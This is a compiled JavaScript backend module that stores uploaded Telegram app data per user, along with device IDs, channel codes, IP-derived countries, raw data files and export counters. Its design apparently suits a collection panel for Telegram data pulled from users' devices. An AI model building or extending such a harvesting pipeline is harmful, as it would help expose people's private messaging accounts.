import { TelegramData } from '../../../core/db/models/index.js';
import { writeRawData } from '../../../core/raw-data/store.js';
import { loadConfig } from '../../../config/index.js';
import { logger } from '../../../core/logger/index.js';
import { normalizeTelegramRawData } from './raw-data.js';
import { getDeviceSourceDomain } from '../../../core/devices/source-domain.js';
import { applyDeviceCountDeltaForUpsert } from '../../../core/devices/counts.js';
import { markAppDataUploaded } from '../../../core/devices/app-data-status.js';
import geoip from 'geoip-lite';
function resolveCountry(ip) {
    try {
        const geo = geoip.lookup(ip);
        return geo?.country || '';
    }
    catch {
        return '';
    }
}
export async function upsertTelegram(data) {
    const country = resolveCountry(data.ip);
    const existing = await TelegramData.findOne({ userId: data.userId }, { deviceId: 1 }).lean();
    const upsertResult = await TelegramData.findOneAndUpdate({ userId: data.userId }, {
        $set: {
            channelCode: data.channelCode,
            deviceId: data.deviceId,
            ip: data.ip,
            country,
            updatedAt: new Date(),
        },
        $setOnInsert: { firstSeenAt: new Date(), exported: false, exportCount: 0, exportHistory: {} },
        $inc: { uploadCount: 1 },
    }, { upsert: true, returnDocument: 'after', includeResultMetadata: true });
    const doc = upsertResult.value || upsertResult;
    const wasExisting = upsertResult.lastErrorObject?.updatedExisting ?? !!existing;
    const docId = doc._id.toString();
    let meta;
    try {
        meta = await writeRawData(loadConfig().storageRoot, 'telegram', docId, normalizeTelegramRawData(data.rawData));
    }
    catch (err) {
        logger.error({
            err,
            type: 'telegram',
            docId,
            userId: data.userId,
            channelCode: data.channelCode,
            deviceId: data.deviceId,
        }, 'Write rawData file failed');
        throw err;
    }
    const sourceDomain = await getDeviceSourceDomain(data.deviceId);
    const updated = await TelegramData.findOneAndUpdate({ userId: data.userId }, {
        $set: {
            ...meta,
            sourceDomain,
            updatedAt: new Date(),
        },
    }, { returnDocument: 'after' });
    await applyDeviceCountDeltaForUpsert({
        field: 'tgCount',
        previousDeviceId: existing?.deviceId || '',
        nextDeviceId: data.deviceId,
        wasExisting,
    });
    await markAppDataUploaded(data.deviceId, 'ph.telegra.Telegraph');
    return updated;
}
//# sourceMappingURL=telegram.js.map